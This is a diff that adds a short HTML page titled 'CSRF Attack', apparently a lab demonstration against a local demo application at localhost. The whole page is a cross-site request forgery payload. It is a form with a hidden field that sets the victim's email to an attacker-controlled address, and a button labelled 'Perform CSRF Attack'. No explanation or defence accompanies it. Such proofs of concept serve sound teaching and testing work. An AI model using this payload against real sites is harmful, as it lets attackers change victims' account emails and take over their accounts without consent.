@@ -1,0 +1,17 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CSRF Attack</title>
+</head>
+<body>
+    <h2>CSRF Attack</h2>
+    <form action="http://localhost/demo/update_info.php" method="post">
+        <!-- Attacker-controlled values -->
+        <input type="hidden" name="new_email" value="attacker@example.com">
+        <!-- Add other necessary fields (anti-CSRF token if present) -->
+        <input type="submit" value="Perform CSRF Attack">
+    </form>
+</body>
+</html>
